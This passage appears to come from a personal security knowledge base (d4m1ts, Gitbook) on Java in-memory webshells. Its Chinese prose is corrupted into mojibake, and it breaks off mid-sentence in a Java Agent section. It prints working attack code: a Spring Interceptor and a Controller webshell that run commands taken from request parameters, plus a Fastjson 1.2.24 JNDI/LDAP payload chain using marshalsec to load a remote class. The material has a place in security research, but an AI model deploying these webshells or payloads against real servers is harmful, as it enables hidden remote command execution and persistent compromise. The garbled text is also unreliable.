ï¼Œä¸€å®šç¨‹åº¦ä¸Šä¹Ÿèµ·åˆ°äº† \"æ‹¦æˆª\" çš„æ•ˆæœã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œä¸€ä¸ª request å‘é€åˆ° spring åº”ç”¨ï¼Œå¤§æ¦‚ä¼šç»è¿‡ä»¥ä¸‹å‡ ä¸ªå±‚é¢æ‰ä¼šåˆ°è¾¾å¤„ç†ä¸šåŠ¡é€»è¾‘çš„ Controller å±‚ï¼š HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Aspect --> Controller ä¸Šé¢æˆ‘ä»¬å®ç°äº†controllerçš„å†…å­˜é©¬ï¼ŒåŒç†ï¼Œæ‹¦æˆªå™¨Interceptorçš„å†…å­˜é©¬ä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ï¼Œå®ç°æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯éœ€è¦å…ˆè·å¾—ä¸Šä¸‹æ–‡ï¼Œç„¶åæ³¨å†Œè¿›å»ã€‚ Interceptorå®ç° ä»ä¸Šé¢çš„åˆ†æï¼Œä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œå°±æ˜¯å®ç°ä¸€ä¸ªæ¶æ„çš„æ‹¦æˆªå™¨ï¼Œç„¶åè®©æ‹¦æˆªå™¨æ‰§è¡ŒpreHandleræ–¹æ³•ï¼Œå…¶ä¸­preHandleræ–¹æ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ä»£ç  Interceptor çš„æ‹¦æˆªèŒƒå›´å…¶å®å°±æ˜¯Controlleræ–¹æ³•ï¼Œå®ƒå®é™…ä¸Šå°±ç›¸å½“äºåŸºäºAOPçš„æ–¹æ³•æ‹¦æˆªã€‚å› ä¸ºInterceptoråªæ‹¦æˆªControlleræ–¹æ³•ï¼Œæ‰€ä»¥è¦æ³¨æ„ï¼Œè¿”å›ModelAndViewåï¼Œåç»­å¯¹Viewçš„æ¸²æŸ“å°±è„±ç¦»äº†Interceptorçš„æ‹¦æˆªèŒƒå›´ã€‚ ä¸€ä¸ªInterceptorå¿…é¡»å®ç°HandlerInterceptoræ¥å£ï¼ˆå¯ä»¥çœ‹ä¸Šé¢çš„åˆ†æå›¾ï¼Œinterceptorçš„ç±»å°±æ˜¯HandlerInterceptorï¼‰ï¼Œå¯ä»¥é€‰æ‹©å®ç°preHandle()ã€postHandle()å’ŒafterCompletion()æ–¹æ³•ã€‚preHandle()æ˜¯Controlleræ–¹æ³•è°ƒç”¨å‰æ‰§è¡Œï¼ŒpostHandle()æ˜¯Controlleræ–¹æ³•æ­£å¸¸è¿”å›åæ‰§è¡Œï¼Œè€ŒafterCompletion()æ— è®ºControlleræ–¹æ³•æ˜¯å¦æŠ›å¼‚å¸¸éƒ½ä¼šæ‰§è¡Œï¼Œå‚æ•°exå°±æ˜¯Controlleræ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ï¼ˆæœªæŠ›å‡ºå¼‚å¸¸æ˜¯nullï¼‰ã€‚ åœ¨preHandle()ä¸­ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¤„ç†å“åº”ï¼Œç„¶åè¿”å›falseè¡¨ç¤ºæ— éœ€è°ƒç”¨Controlleræ–¹æ³•ç»§ç»­å¤„ç†äº†ï¼Œé€šå¸¸åœ¨è®¤è¯æˆ–è€…å®‰å…¨æ£€æŸ¥å¤±è´¥æ—¶ç›´æ¥è¿”å›é”™è¯¯å“åº”ã€‚åœ¨postHandle()ä¸­ï¼Œå› ä¸ºæ•è·äº†Controlleræ–¹æ³•è¿”å›çš„ModelAndViewï¼Œæ‰€ä»¥å¯ä»¥ç»§ç»­å¾€ModelAndViewé‡Œæ·»åŠ ä¸€äº›é€šç”¨æ•°æ®ï¼Œå¾ˆå¤šé¡µé¢éœ€è¦çš„å…¨å±€æ•°æ®å¦‚Copyrightä¿¡æ¯ç­‰éƒ½å¯ä»¥æ”¾åˆ°è¿™é‡Œï¼Œæ— éœ€åœ¨æ¯ä¸ªControlleræ–¹æ³•ä¸­é‡å¤æ·»åŠ ã€‚ æ‹¦æˆªå™¨ä»£ç  å®ç°ä¸€ä¸ªæ‹¦æˆªå™¨ package com.example.demo; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { response.getWriter().write(\"Interceptor test\"); return false; } } æ­£å¸¸æ³¨å†Œæ‹¦æˆªå™¨ å¯ä»¥é€šè¿‡implements WebMvcConfigurerï¼Œé‡å†™å…¶addInterceptors(InterceptorRegistry registry)æ–¹æ³• package com.example.demo; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new TestInterceptor()).addPathPatterns(\"/test/hello\"); } } æ•ˆæœ æ¶æ„æ³¨å†Œæ‹¦æˆªå™¨ ä¸Šé¢åˆ†æä¹Ÿçœ‹å‡ºæ¥äº†ï¼Œæƒ³è¦æ·»åŠ æ‹¦æˆªå™¨ï¼Œå°±åªéœ€è¦åŠ¨æ€æ·»åŠ åˆ°this.adaptedInterceptorsæ•°ç»„ä¸­å³å¯ æ‰€ä»¥æˆ‘ä»¬çš„ç¬¬ä¸€æ­¥æ˜¯è¦è·å–åˆ°è¿™ä¸ªæ•°ç»„ï¼Œè€Œè¿™ä¸ªæ•°ç»„æ˜¯åœ¨org.springframework.web.servlet.handler.AbstractHandlerMappingä¸­å®ç°çš„ï¼ŒAbstractHandlerMappingåˆæ˜¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å®ƒçš„å®ç°ç±» ä¸‹å­—æ®µæ–­ç‚¹ä¹Ÿå¯ä»¥æ‰¾åˆ°å®ƒçš„å®ç°ç±» org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMappingæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œå¯ä»¥é€šè¿‡context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\");è·å–å®ä¾‹ï¼Œç„¶åå†åå°„è·å–åˆ°adaptedInterceptorså˜é‡ï¼Œæœ€åæ·»åŠ æ¶æ„çš„æ‹¦æˆªå™¨å³å¯ è¿™é‡Œæˆ‘å°è¯•å¤±è´¥äº†ï¼Œè¿˜æ˜¯æ€€ç–‘springç‰ˆæœ¬é—®é¢˜ æ‰€ä»¥åˆ©ç”¨ä»£ç  import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor extends HandlerInterceptorAdapter { public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException { // è·å–context WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // ä»contextä¸­è·å–AbstractHandlerMappingçš„å®ä¾‹å¯¹è±¡ org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\"); // åå°„è·å–adaptedInterceptorså±æ€§ java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); // é¿å…é‡å¤æ·»åŠ  for (int i = adaptedInterceptors.size() - 1; i > 0; i--) { if (adaptedInterceptors.get(i) instanceof TestInterceptor) { System.out.println(\"å·²ç»æ·»åŠ è¿‡TestInterceptorå®ä¾‹äº†\"); return; } } TestInterceptor aaa = new TestInterceptor(\"aaa\"); // é¿å…è¿›å…¥å®ä¾‹åˆ›å»ºçš„æ­»å¾ªç¯ adaptedInterceptors.add(aaa); // æ·»åŠ å…¨å±€interceptor } private TestInterceptor(String aaa){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String code = request.getParameter(\"code\"); // ä¸å¹²æ‰°æ­£å¸¸ä¸šåŠ¡é€»è¾‘ if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; }}} åº”ç”¨åœºæ™¯ æ—¢ç„¶æ˜¯é€šè¿‡æ‰§è¡Œ java ä»£ç å†…å­˜æ³¨å…¥ webshellï¼Œé‚£ä¹ˆä¸€èˆ¬éœ€è¦é€šè¿‡ Spring ç›¸å…³çš„ä»£ç æ‰§è¡Œæ¼æ´æ‰å¯ä»¥åˆ©ç”¨ï¼Œä¾‹å¦‚è¾ƒä¸ºå¸¸è§çš„ Java ååºåˆ—æ¼æ´ã€æ™®é€šçš„ JSP æ–‡ä»¶ Webshell è½¬æ¢æˆæ— æ–‡ä»¶ Webshellç­‰ã€‚ ä¸»è¦ç›®çš„æ˜¯åœ¨å½“å‰JVMçš„ç¯å¢ƒä¸‹æ‰§è¡Œä»£ç å³å¯ æ¼æ´æ¼”ç¤º ä»¥Fastjson 1.2.24 çš„ååºåˆ—åŒ–æ¼æ´ä¸ºä¾‹å§ï¼Œå…ˆé…ç½®å¥½ç¯å¢ƒï¼ˆJDK pom.xml com.alibaba fastjson 1.2.24 Controller package com.example.demo; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @PostMapping(\"/hello\") public String hello(String json) { JSONObject jsonObject = JSON.parseObject(json); return jsonObject.toJSONString(); } } ç¼–å†™æ¶æ„çš„ç±» import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; import java.lang.reflect.Method; public class Test { public Test() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); Method method = Test.class.getDeclaredMethod(\"test\", HttpServletRequest.class, HttpServletResponse.class); PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, new Test(\"aaa\"), method); } private Test(String aa){ // ä¸è¿™æ ·çš„è¯ï¼Œä¸Šé¢22è¡Œä¼šä¸€ç›´é‡å¤åˆ›å»ºTest()å¯¹è±¡ï¼Œå¯¼è‡´å†…å­˜æº¢å‡º } public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } ç¼–è¯‘æˆclassæ–‡ä»¶ ç¼ºå°‘ä¾èµ–é—®é¢˜æ¯”è¾ƒç®€å•çš„è§£å†³æ–¹æ³•ï¼Œå°±æ˜¯ç›´æ¥ç”¨IDEAç¼–è¯‘çš„classï¼Œç„¶åç§»åŠ¨åˆ°å…¶ä»–ç›®å½•å³å¯ å¯åŠ¨httpæœåŠ¡ python3 -m http.server 8000 å¯åŠ¨ldapæœåŠ¡ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Test 8088 ç„¶åç”¨fastjson payloadæ‰“è¿‡å» { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:8088/Test\", \"autoCommit\": true } } æ•ˆæœ å‚è€ƒ æ·±å…¥æµ…å‡ºå†…å­˜é©¬(äºŒ) ä¹‹SpringBootå†…å­˜é©¬ï¼ˆæ–‡æœ«è§†é¢‘æ•™å­¦ï¼‰ é’ˆå¯¹Spring MVCçš„Interceptorå†…å­˜é©¬ åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ ä¸€æ–‡äº†è§£å†…å­˜é©¬ï¼š æœ€ä¸‹é¢å¾ˆå¤šå‚è€ƒé“¾æ¥ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:02 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/03.Java Agent å†…å­˜é©¬.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/03.Java Agent å†…å­˜é©¬.html","title":"03.Java Agent å†…å­˜é©¬","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» premain agentmain VirtualMachine å®ç°ä¸¾ä¾‹ Instrumentation è·å–æ‰€æœ‰å¯ä¿®æ”¹ç±» ä¿®æ”¹ç±» ClassFileTransformer javassist ä¾èµ– ClassPool CtClass CtMethod ç¤ºä¾‹ å†…å­˜é©¬ Spring Bootçš„Filter Java agentä¿®æ”¹doFilter æ‹“å±•æ“ä½œ æŸ¥æ€ é£é™© å†…å­˜é©¬å¤æ´» æ€»è§ˆ ä»‹ç» Java agentæ˜¯ä¸€ç§ç‰¹æ®Šçš„Javaç¨‹åºï¼ˆJaræ–‡ä»¶ï¼‰ï¼Œå®ƒæ˜¯Instrumentationçš„å®¢æˆ·ç«¯ã€‚ä¸æ™®é€šJavaç¨‹åºé€šè¿‡mainæ–¹æ³•å¯åŠ¨ä¸åŒï¼Œagentå¹¶ä¸æ˜¯ä¸€ä¸ªå¯ä»¥å•ç‹¬å¯åŠ¨çš„ç¨‹åºï¼Œè€Œå¿…é¡»ä¾é™„åœ¨ä¸€ä¸ªJavaåº”ç”¨ç¨‹åºï¼ˆJVMï¼‰ä¸Šï¼Œä¸å®ƒè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œé€šè¿‡Instrumentation APIä¸è™šæ‹Ÿæœºäº¤äº’ã€‚ åœ¨æ³¨å…¥å†…å­˜é©¬çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨java instrumentationæœºåˆ¶ï¼ŒåŠ¨æ€çš„ä¿®æ”¹å·²åŠ è½½åˆ°å†…å­˜ä¸­çš„ç±»é‡Œçš„æ–¹æ³•ï¼Œè¿›è€Œæ³¨å…¥æ¶æ„çš„ä»£ç ã€‚ javaä½œä¸ºä¸€ç§å¼ºç±»å‹çš„è¯­è¨€ï¼Œä¸é€šè¿‡ç¼–è¯‘å°±ä¸èƒ½å¤Ÿè¿›è¡ŒjaråŒ…çš„ç”Ÿæˆã€‚è€Œæœ‰äº†java agentæŠ€æœ¯ï¼Œå°±å¯ä»¥åœ¨å­—èŠ‚ç è¿™ä¸ªå±‚é¢å¯¹ç±»å’Œæ–¹æ³•è¿›è¡Œä¿®æ”¹ã€‚åŒæ—¶ï¼Œä¹Ÿå¯ä»¥æŠŠjava agentç†è§£æˆä¸€ç§ä»£ç æ³¨å…¥çš„æ–¹å¼ã€‚ä½†æ˜¯è¿™ç§æ³¨å…¥æ¯”èµ·springçš„aopæ›´åŠ çš„ä¼˜ç¾ã€‚ Java agentçš„ä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼š å®ç°premainæ–¹æ³•ï¼Œåœ¨JVMå¯åŠ¨å‰åŠ è½½ã€‚ å®ç°agentmainæ–¹æ³•ï¼Œåœ¨JVMå¯åŠ¨ååŠ è½½ã€‚ premainå’Œagentmainå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼Œæ‹¥æœ‰Instrumentation instå‚æ•°çš„æ–¹æ³•ä¼˜å…ˆçº§æ›´é«˜ï¼š public static void agentmain(String agentArgs, Instrumentation inst) { ... } public static void agentmain(String agentArgs) { ... } public static void premain(String agentArgs, Instrumentation inst) { ... } public static void premain(String agentArgs) { ... } ç¬¬ä¸€ä¸ªå‚æ•°String agentArgså°±æ˜¯Java agentçš„å‚æ•°ã€‚ ç¬¬äºŒä¸ªå‚æ•°Instrumentation instç›¸å½“é‡è¦ï¼Œinst æ˜¯ä¸€ä¸ª java.lang.instrument.Instrumentation çš„å®ä¾‹ï¼Œç”± JVM è‡ªåŠ¨ä¼ å…¥ã€‚java.lang.instrument.Instrumentation æ˜¯ instrument åŒ…ä¸­å®šä¹‰çš„ä¸€ä¸ªæ¥å£ï¼Œä¹Ÿæ˜¯è¿™ä¸ªåŒ…çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œé›†ä¸­äº†å…¶ä¸­å‡ ä¹æ‰€æœ‰çš„åŠŸèƒ½æ–¹æ³•ï¼Œä¾‹å¦‚ç±»å®šä¹‰çš„è½¬æ¢å’Œæ“ä½œç­‰ç­‰ã€‚ premain è¿™é‡Œç®€å•çš„ä¸¾ä¾‹è¯´æ˜premainçš„ä½¿ç”¨ï¼Œåˆ›å»ºä¸€ä¸ªmavené¡¹ç›® ç¼–å†™premainå‡½æ•° import java.lang.instrument.Instrumentation; public class Main { public static void premain(String agentArgs, Instrumentation inst){ for(int i=0; i åœ¨resourcesç›®å½•ä¸‹åˆ›å»ºMETA-INF/MANIFEST.MFï¼Œå¹¶æŒ‡å®šPremain-Classï¼›è¦æ³¨æ„çš„æ˜¯ï¼Œæœ€åå¿…é¡»å¤šä¸€ä¸ªæ¢è¡Œã€‚ Manifest-Version: 1.0 Premain-Class: Main ç„¶åæ‰“åŒ…æˆjaræ–‡ä»¶ï¼Œåœ¨Project Structure -> Artifacts -> JAR -> From modules with dependenciesä¸­é…ç½® é»˜è®¤é€‰é¡¹å°±è¡Œ ç„¶åé€‰æ‹©Build -> Build Artifacts -> Build ä¼šåœ¨out/artifacts/javaagent_jarç›®å½•ä¸‹ç”Ÿæˆå¯¹åº”çš„jaræ–‡ä»¶ éšä¾¿æ‰¾ä¸ªjaræ–‡ä»¶ç¤ºä¾‹ï¼Œæ¯”å¦‚æˆ‘ä»¬å†™ä¸ªhello wordï¼Œä½¿ç”¨ -javaagent:agent.jar å‚æ•°æ‰§è¡Œ java -javaagent:javaagent.jar -jar hello.jar å¯ä»¥å‘ç°åœ¨hello.jarè¾“å‡ºHello worldä¹‹å‰å°±æ‰§è¡Œäº†ï¼Œå…·ä½“æ‰§è¡Œæµç¨‹å¤§è‡´å¦‚ä¸‹ ç„¶è€Œè¿™ç§æ–¹æ³•å­˜åœ¨ä¸€å®šçš„å±€é™æ€§ï¼šåªèƒ½åœ¨å¯åŠ¨æ—¶ä½¿ç”¨-javaagentå‚æ•°æŒ‡å®šã€‚ åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œç›®æ ‡çš„JVMé€šå¸¸éƒ½æ˜¯å·²ç»å¯åŠ¨çš„çŠ¶æ€ï¼Œæ— æ³•é¢„å…ˆåŠ è½½premainã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œagentmainæ›´åŠ å®ç”¨ã€‚ agentmain å†™ä¸€ä¸ªagentmainå’Œpremainå·®ä¸å¤šï¼Œåªéœ€è¦åœ¨META-INF/MANIFEST.MFä¸­åŠ å…¥Agent-Class:å³å¯ã€‚ Manifest-Version: 1.0 Agent-Class: AgentMain ä¸åŒçš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•ä¸æ˜¯é€šè¿‡JVMå¯åŠ¨å‰çš„å‚æ•°æ¥æŒ‡å®šçš„ï¼Œå®˜æ–¹ä¸ºäº†å®ç°å¯åŠ¨ååŠ è½½ï¼Œæä¾›äº†Attach APIã€‚Attach API å¾ˆç®€å•ï¼Œåªæœ‰ 2 ä¸ªä¸»è¦çš„ç±»ï¼Œéƒ½åœ¨ com.sun.tools.attach åŒ…é‡Œé¢ã€‚ç€é‡å…³æ³¨çš„æ˜¯VitualMachineè¿™ä¸ªç±»ã€‚ éœ€è¦ä¾èµ–VitualMachineçš„loadAgentè¾¾åˆ°attachçš„ç›®çš„ VirtualMachine å­—é¢æ„ä¹‰è¡¨ç¤ºä¸€ä¸ªJava è™šæ‹Ÿæœºï¼Œä¹Ÿå°±æ˜¯ç¨‹åºéœ€è¦ç›‘æ§çš„ç›®æ ‡è™šæ‹Ÿæœºï¼Œæä¾›äº†è·å–ç³»ç»Ÿä¿¡æ¯ã€ loadAgentï¼Œattach å’Œ detach ç­‰æ–¹æ³•ï¼Œå¯ä»¥å®ç°çš„åŠŸèƒ½å¯ä»¥è¯´éå¸¸ä¹‹å¼ºå¤§ ã€‚è¯¥ç±»å…è®¸æˆ‘ä»¬é€šè¿‡ç»™attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªjvmçš„pid(è¿›ç¨‹id)ï¼Œè¿œç¨‹è¿æ¥åˆ°jvmä¸Š ã€‚ä»£ç†ç±»æ³¨å…¥æ“ä½œåªæ˜¯å®ƒä¼—å¤šåŠŸèƒ½ä¸­çš„ä¸€ä¸ªï¼Œé€šè¿‡loadAgentæ–¹æ³•å‘jvmæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ã€‚ å…·ä½“çš„ç”¨æ³•çœ‹ä¸€ä¸‹å®˜æ–¹ç»™çš„ä¾‹å­å¤§æ¦‚å°±ç†è§£äº†ï¼š // com.sun.tools.attach.VirtualMachine // ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨VirtualMachine: // attach to target VM VirtualMachine vm = VirtualMachine.attach(\"2177\"); // start management agent Properties props = new Properties(); props.put(\"com.sun.management.jmxremote.port\", \"5000\"); vm.startManagementAgent(props); // detach vm.detach(); // åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é™„åŠ åˆ°ç”±è¿›ç¨‹æ ‡è¯†ç¬¦2177æ ‡è¯†çš„Javaè™šæ‹Ÿæœºã€‚ç„¶åï¼Œä½¿ç”¨æä¾›çš„å‚æ•°åœ¨ç›®æ ‡è¿›ç¨‹ä¸­å¯åŠ¨JMXç®¡ç†ä»£ç†ã€‚æœ€åï¼Œå®¢æˆ·ç«¯ä»ç›®æ ‡VMåˆ†ç¦»ã€‚ ä¸‹é¢åˆ—å‡ ä¸ªè¿™ä¸ªç±»æä¾›çš„æ–¹æ³•ï¼š com.sun.tools.attach.VirtualMachine public abstract class VirtualMachine { // è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨ public static List list() { ... } // æ ¹æ®pidè¿æ¥åˆ°JVM public static VirtualMachine attach(String id) { ... } // æ–­å¼€è¿æ¥ public abstract void detach() {} // åŠ è½½agentï¼Œagentmainæ–¹æ³•é çš„å°±æ˜¯è¿™ä¸ªæ–¹æ³• public void loadAgent(String agent) { ... } } å®ç°ä¸¾ä¾‹ Attach.javaï¼ˆæ‰¾åˆ°è¿›ç¨‹ï¼ŒåŠ è½½agentMain.jarï¼‰ import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { if(args.length == 2){ String pid = args[0]; String jarName = args[1]; System.out.println(\"attach çš„ pid ==> \" + pid); System.out.println(\"attach çš„ jarName ==> \" + jarName); // è¿æ¥åˆ°JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // åŠ è½½agentmain virtualMachine.loadAgent(jarName); // æ–­å¼€è¿æ¥ virtualMachine.detach(); System.out.println(\"ends\"); } else{ System.out.println(\"è‡³å°‘2ä¸ªå‚æ•°\"); // åˆ—å‡ºæ‰€æœ‰çš„jvm System.out.println(VirtualMachine.list()); } } } AgentMain.javaï¼ˆæƒ³è¦åŠ¨æ€å®ç°çš„ä»£ç ï¼‰ import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { for(int i=0; i å¯ä»¥å†™ä¸€èµ·æ‰“åŒ…æˆä¸€ä¸ªjarï¼Œä¹Ÿå¯ä»¥åˆ†å¼€æ‰“åŒ…æˆ2ä¸ªï¼Œé—®é¢˜éƒ½ä¸å¤§ï¼Œåªè¦MANIFST.MFæ²¡é—®é¢˜å°±è¡Œ Manifest-Version: 1.0 PreMain-Class: PreMain Agent-Class: AgentMain Main-Class: Attach æ‰¾ä¸€ä¸‹æƒ³è¦æ“ä½œçš„jvmçš„pidï¼ˆä¹Ÿå¯ä»¥ç”¨ä¸Šé¢çš„list()æ–¹æ³•çœ‹åˆ°pidï¼‰ é…ç½®å‚æ•° java -jar attach.jar 63242 agentMain.jar ä¹Ÿå¯ä»¥æ‰‹åŠ¨åœ¨ideaé‡Œé¢é…ç½®å¥½ è¿è¡Œ è½¬åˆ°æˆ‘ä»¬æƒ³è¦attachçš„tomcatä¸­çœ‹çœ‹æ•ˆæœ Instrumentation åˆšæ‰è¯´äº†ç¬¬äºŒä¸ªå‚æ•°Instrumentation instç›¸å½“é‡è¦ï¼Œinst æ˜¯ä¸€ä¸ª java.lang.instrument.Instrumentation çš„å®ä¾‹ï¼Œç”± JVM è‡ªåŠ¨ä¼ å…¥ã€‚java.lang.instrument.Instrumentation æ˜¯ instrument åŒ…ä¸­å®šä¹‰çš„ä¸€ä¸ªæ¥å£ï¼Œä¹Ÿæ˜¯è¿™ä¸ªåŒ…çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œé›†ä¸­äº†å…¶ä¸­å‡ ä¹æ‰€æœ‰çš„åŠŸèƒ½æ–¹æ³•ï¼Œä¾‹å¦‚ç±»å®šä¹‰çš„è½¬æ¢å’Œæ“ä½œç­‰ç­‰ã€‚ ä¸‹é¢åˆ—å‡ºè¿™ä¸ªç±»çš„ä¸€äº›æ–¹æ³•ï¼Œæ›´åŠ è¯¦ç»†çš„ä»‹ç»å’Œæ–¹æ³•ï¼Œå¯ä»¥å‚ç…§å®˜æ–¹æ–‡æ¡£ï¼Œä¹Ÿå¯ä»¥çœ‹è¿™ä¸ªç±»æºç é‡Œé¢çš„è¯´æ˜ public interface Instrumentation { // å¢åŠ ä¸€ä¸ª Class æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚ void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨ boolean removeTransformer(ClassFileTransformer transformer); // åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚ void retransformClasses(Class... classes) throws UnmodifiableClassException; // åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦èƒ½å¤Ÿä¿®æ”¹ã€‚ boolean isModifiableClass(Class theClass); // è·å–ç›®æ 